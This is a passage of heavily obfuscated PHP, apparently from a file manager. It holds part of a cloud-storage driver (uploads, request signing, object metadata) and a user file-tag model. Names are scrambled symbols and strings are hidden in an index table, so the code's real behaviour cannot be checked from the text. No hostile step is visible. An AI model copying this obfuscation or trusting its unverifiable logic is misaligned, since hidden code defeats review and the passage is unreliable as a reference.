$this->fileOutServer($Æ§˜×ùí, $Ñ€ïüÚ–, $‚ìşæ¨, $„“Éñ‡–); } if (!$‚ìşæ¨) { $‚ìşæ¨ = $this->pathThis($Æ§˜×ùí); } $‘‹ÌŸü§ = get_file_mime(get_path_ext($‚ìşæ¨)); if ($‘‹ÌŸü§ == $“ÒÙÔ‰[258]) { return parent::fileOut($Æ§˜×ùí, $Ñ€ïüÚ–, $‚ìşæ¨, $„“Éñ‡–); } $Ë£œÕ…š = array($“ÒÙÔ‰[259] => $‘‹ÌŸü§); if ($Ñ€ïüÚ–) { $Ë£œÕ…š[$“ÒÙÔ‰[260]] = $“ÒÙÔ‰[261] . rawurlencode($‚ìşæ¨); } else { } $¾îˆ‚ˆÓ = $this->link($Æ§˜×ùí, $Ë£œÕ…š); $this->fileOutLink($¾îˆ‚ˆÓ); } public function fileOutServer($³ïãĞœ, $›ÜÖõ’á = false, $«ğµïÁ½ = false, $Ì«ğåôÑ = '') { parent::fileOut($³ïãĞœ, $›ÜÖõ’á, $«ğµïÁ½, $Ì«ğåôÑ); } public function fileOutImageServer($ìİ›ëÍØ, $…¡¡ÆÀ = 250) { parent::fileOutImage($ìİ›ëÍØ, $…¡¡ÆÀ); } public function hashMd5($Î™µóñõ, $¶ØèçÏÊ = '') { $¬†ƒŞÈ¶ = $this->objectMeta($Î™µóñõ); if (!$¬†ƒŞÈ¶) { return !1; } $¶ØèçÏÊ = $¶ØèçÏÊ ? $¶ØèçÏÊ : _get($¬†ƒŞÈ¶, $_SERVER[÷ôÚîå][262]); return $¶ØèçÏÊ; } public function uploadFormData($¡š½‘Ë’, $ËÄ×Ô¬ô = 3600) { $”°òé„† =& $_SERVER[÷ôÚîå]; $çÖÔëè¯ = $this->pathFather($¡š½‘Ë’); $¢‡…¢©ë = $this->client->getHttpUploadPostParams($this->bucket, $çÖÔëè¯, $”°òé„†[239], $ËÄ×Ô¬ô); return array_merge((array) $¢‡…¢©ë, array($”°òé„†[218] => $this->getHost())); } public function multiUploadFormData($­‰Ø†Š, $Ó¹È‘ = 3600) { $ôàÄáö´ =& $_SERVER[÷ôÚîå]; $îé®±™ = gmdate($ôàÄáö´[263]); $¬ùìÃÙ = array(); $”èØåãî = $this->client->getUploadId($this->bucket, $­‰Ø†Š, $¬ùìÃÙ); if (!$”èØåãî) { return !1; } return array($ôàÄáö´[264] => $”èØåãî, $ôàÄáö´[218] => $this->getHost() . $ôàÄáö´[8] . $this->pathEncode($­‰Ø†Š), $ôàÄáö´[265] => $îé®±™, $ôàÄáö´[107] => $­‰Ø†Š); } public function multiUploadAuthData($ì¤„Õ©, $¸»ûä´™ = array()) { $À–¨î’€ =& $_SERVER[÷ôÚîå]; $ÄÏæÙà = isset($¸»ûä´™[$À–¨î’€[265]]) ? $¸»ûä´™[$À–¨î’€[265]] : gmdate($À–¨î’€[263]); $˜Î·¢Šë = isset($¸»ûä´™[$À–¨î’€[179]]) ? $¸»ûä´™[$À–¨î’€[179]] : $À–¨î’€[12]; $·¡¢Ñ¶€ = $¸»ûä´™[$À–¨î’€[107]]; unset($¸»ûä´™[$À–¨î’€[107]]); if (isset($¸»ûä´™[$À–¨î’€[266]])) { $¸»ûä´™[$À–¨î’€[265]] = $ÄÏæÙà; return $this->listUploadParts($·¡¢Ñ¶€, $¸»ûä´™); } $¿ë¢êñ = array($À–¨î’€[267], $À–¨î’€[12], $À–¨î’€[133], $À–¨î’€[12], "\170\x2d\141\155\172\x2d\144\x61\164\x65\72{$ÄÏæÙà}", $À–¨î’€[8] . $this->bucket . $À–¨î’€[8] . $this->pathEncode($·¡¢Ñ¶€) . $˜Î·¢Šë); if (strpos($˜Î·¢Šë, $À–¨î’€[268]) === 0) { $¿ë¢êñ[0] = $À–¨î’€[269]; } if (isset($¸»ûä´™[$À–¨î’€[270]]) && $¸»ûä´™[$À–¨î’€[270]] == $À–¨î’€[271]) { $¿ë¢êñ[0] = $À–¨î’€[271]; } $¡Éšôë = implode($À–¨î’€[65], $¿ë¢êñ); $›æŒå› = base64_encode(hash_hmac($À–¨î’€[272], $¡Éšôë, $this->secret, !0)); $®ÏÖñå„ = $À–¨î’€[273] . $this->accessKey . $À–¨î’€[4] . $›æŒå›; if (strpos($˜Î·¢Šë, $À–¨î’€[268]) === 0) { return array($À–¨î’€[274] => $®ÏÖñå„, $À–¨î’€[265] => $ÄÏæÙà); } return $®ÏÖñå„; } public function listUploadParts($ üûÈš†, $ïÏ€è«ª = array()) { $¦®†ø­Á =& $_SERVER[÷ôÚîå]; $ÔÖÎŸòĞ = str_replace($¦®†ø­Á[275], $¦®†ø­Á[12], $ïÏ€è«ª[$¦®†ø­Á[179]]); $¼Ö¥¤È = $this->client->listParts($this->bucket, $ üûÈš†, $ÔÖÎŸòĞ); if (!$¼Ö¥¤È) { return !1; } unset($ïÏ€è«ª[$¦®†ø­Á[266]], $ïÏ€è«ª[$¦®†ø­Á[270]]); $ïÏ€è«ª[$¦®†ø­Á[107]] = $ üûÈš†; $¹Ï”¨¡§ = $this->multiUploadAuthData($ üûÈš†, $ïÏ€è«ª); if (empty($¹Ï”¨¡§)) { return !1; } return array($¦®†ø­Á[274] => $¹Ï”¨¡§, $¦®†ø­Á[265] => $ïÏ€è«ª[$¦®†ø­Á[265]], $¦®†ø­Á[276] => $¼Ö¥¤È); } public function getHost() { $¯„¸µ±è =& $_SERVER[÷ôÚîå]; $Çœä“‹ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($¯„¸µ±è[80], $¯„¸µ±è[74], $¯„¸µ±è[79], $¯„¸µ±è[72]))) { return $Çœä“‹ . $¯„¸µ±è[8] . $this->bucket; } $Çœä“‹ = explode($¯„¸µ±è[220], $Çœä“‹); return $Çœä“‹[0] . $¯„¸µ±è[220] . $this->bucket . $¯„¸µ±è[10] . $Çœä“‹[1]; } public function size($‡…ŞŸ”ş) { $òˆ ´ = $this->objectMeta($‡…ŞŸ”ş); return $òˆ ´ ? $òˆ ´[$_SERVER[÷ôÚîå][89]] : 0; } public function info($ÑìÕ¨€) { if ($this->isFolder($ÑìÕ¨€)) { return $this->folderInfo($ÑìÕ¨€); } else { if ($this->isFile($ÑìÕ¨€)) { return $this->fileInfo($ÑìÕ¨€); } } return !1; } public function exist($ñˆÄ°Ìş) { return $this->isFile($ñˆÄ°Ìş) || $this->isFolder($ñˆÄ°Ìş); } public function isFile($ÃáÒÆ†“) { return !$this->isFolder($ÃáÒÆ†“) && $this->objectMeta($ÃáÒÆ†“); } public function isFolder($íúâæ†) { return $this->cacheMethod($_SERVER[÷ôÚîå][189], $íúâæ†); } protected function objectMeta($‰ÃØòÁ¬) { return $this->cacheMethod($_SERVER[÷ôÚîå][191], $‰ÃØòÁ¬); } protected function _objectMeta($˜ê€†éî) { $ëàâ©Äè =& $_SERVER[÷ôÚîå]; $˜ê€†éî = rtrim($˜ê€†éî, $ëàâ©Äè[8]); try { $ĞÈ½Å = $this->client->getObjectInfo($this->bucket, $˜ê€†éî); if (!isset($ĞÈ½Å[$ëàâ©Äè[262]]) && isset($ĞÈ½Å[$ëàâ©Äè[277]])) { $ĞÈ½Å[$ëàâ©Äè[262]] = $ĞÈ½Å[$ëàâ©Äè[277]]; } } catch (Exception $µËËñ÷ø) { $ĞÈ½Å = !1; } if (!$ĞÈ½Å) { } return $ĞÈ½Å; } protected function _isFolder($õØƒçˆ­) { $ÁÒ‡ËÄ =& $_SERVER[÷ôÚîå]; $õØƒçˆ­ = rtrim($õØƒçˆ­, $ÁÒ‡ËÄ[8]); if ($õØƒçˆ­ == $ÁÒ‡ËÄ[12] || $õØƒçˆ­ == $ÁÒ‡ËÄ[8]) { return !0; } $—¿‹Ë§¿ = $this->client->getBucket($this->bucket, $õØƒçˆ­, null, 1); if (empty($—¿‹Ë§¿[$ÁÒ‡ËÄ[246]])) { return !1; } $¬´õ¢ß´ = $—¿‹Ë§¿[$ÁÒ‡ËÄ[246]][0][$ÁÒ‡ËÄ[32]]; return stripos($¬´õ¢ß´, $õØƒçˆ­ . $ÁÒ‡ËÄ[8]) === 0 ? !0 : !1; if (substr($¬´õ¢ß´, -1) == $ÁÒ‡ËÄ[8]) { return !0; } if (get_path_this($¬´õ¢ß´) == get_path_this($õØƒçˆ­)) { return !1; } return !0; } public function listObject($ùØ®éÅÃ) { return $this->fileList($ùØ®éÅÃ, $_SERVER[÷ôÚîå][12], !0); } } goto A¨—Çøå‰; b„Ê¼òİÁŠ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\146\141\x76"; protected function cacheFunctionAlias($ÚŒä ) { $š«§ÜûÏ =& $_SERVER[÷ôÚîå]; return array($š«§ÜûÏ[2093] => array($š«§ÜûÏ[2508] . USER_ID, $š«§ÜûÏ[2094])); } protected function listData() { $¬Ü”şÕÛ =& $_SERVER[÷ôÚîå]; $¯¥ªÆÇ… = array($¬Ü”şÕÛ[1770] => USER_ID, $¬Ü”şÕÛ[566] => array($¬Ü”şÕÛ[2097], 0)); $ØØæ›  = $¬Ü”şÕÛ[2509]; $·¬ş€š = $this->field($ØØæ› )->where($¯¥ªÆÇ…)->order($¬Ü”şÕÛ[2100])->select(); return $·¬ş€š ? $·¬ş€š : array(); } protected function addToTag($¬úŸØ¥£, $õ‘ì¾ä­) { $å¨íîŸ€ =& $_SERVER[÷ôÚîå]; if (!Model($å¨íîŸ€[2244])->listData($õ‘ì¾ä­)) { return !1; } if (is_numeric($¬úŸØ¥£)) { $ÁÔµè¥½ = Model($å¨íîŸ€[914])->pathInfo($¬úŸØ¥£); if (!$ÁÔµè¥½) { return !1; } } else { $ÁÔµè¥½ = IO::infoSimple($¬úŸØ¥£); if (!$ÁÔµè¥½) { return !1; } $«‚¡ÔÉ¡ = $ÁÔµè¥½[$å¨íîŸ€[32]]; $ãŒ·±Â¿ = $ÁÔµè¥½[$å¨íîŸ€[33]]; if (isset($ÁÔµè¥½[$å¨íîŸ€[494]])) { $ãŒ·±Â¿ = $ÁÔµè¥½[$å¨íîŸ€[494]] == $å¨íîŸ€[101] ? $å¨íîŸ€[88] : $å¨íîŸ€[240]; } } $ªòåÀÌŒ = array($å¨íîŸ€[1770] => USER_ID, $å¨íîŸ€[566] => $õ‘ì¾ä­, $å¨íîŸ€[504] => $¬úŸØ¥£, $å¨íîŸ€[505] => $ãŒ·±Â¿ ? $ãŒ·±Â¿ : $å¨íîŸ€[499], $å¨íîŸ€[503] => $«‚¡ÔÉ¡ ? $«‚¡ÔÉ¡ : $å¨íîŸ€[12], $å¨íîŸ€[1982] => 0); if ($this->where($ªòåÀÌŒ)->find()) { return !1; } return $this->add($ªòåÀÌŒ); } protected function removeFromTag($ÙæŞêé‹, $„ùö‰²á) { $¾é—£Òİ =& $_SERVER[÷ôÚîå]; if (!Model($¾é—£Òİ[2244])->listData($„ùö‰²á)) { return !1; } if (is_array($ÙæŞêé‹)) { $ÙæŞêé‹ = array($¾é—£Òİ[7], $ÙæŞêé‹); } $Üı§¬’› = array($¾é—£Òİ[1770] => USER_ID, $¾é—£Òİ[566] => $„ùö‰²á, $¾é—£Òİ[504] => $ÙæŞêé‹); return $this->where($Üı§¬’›)->delete(); } protected function removeByTag($¹“Ïˆ) { $ğÛˆéåÇ =& $_SERVER[÷ôÚîå]; if (!$¹“Ïˆ) { return !1; } $›ˆù½¼© = array($ğÛˆéåÇ[1770] => USER_ID, $ğÛˆéåÇ[566] => $¹“Ïˆ); return $this->where($›ˆù½¼©)->delete(); } protected function removeBySource($çû±­½ƒ) { $øâÕüÙ =& $_SERVER[÷ôÚîå]; if (is_array($çû±­½ƒ)) { $çû±­½ƒ = array($øâÕüÙ[7], $çû±­½ƒ); } $ºŠÄÏÈõ = array($øâÕüÙ[1770] => USER_ID, $øâÕüÙ[566] => array($øâÕüÙ[1103], 0), $øâÕüÙ[504] => $çû±­½ƒ); return $this->where($ºŠÄÏÈõ)->delete(); } }